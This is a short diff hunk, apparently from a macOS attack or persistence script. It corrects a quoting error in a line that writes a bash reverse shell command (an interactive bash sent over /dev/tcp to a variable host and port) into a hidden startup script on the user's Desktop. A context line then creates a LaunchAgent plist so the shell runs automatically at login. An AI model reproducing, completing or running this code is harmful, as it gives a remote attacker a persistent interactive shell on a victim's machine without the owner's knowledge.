@@ -1,4 +1,4 @@
-echo "bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &' > /Users/$(whoami)/Desktop/.runonstartupMACOS.sh
+echo "bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'" > /Users/$(whoami)/Desktop/.runonstartupMACOS.sh
 
 touch ~/Library/LaunchAgents/com.4lpndev.strt.plist
 
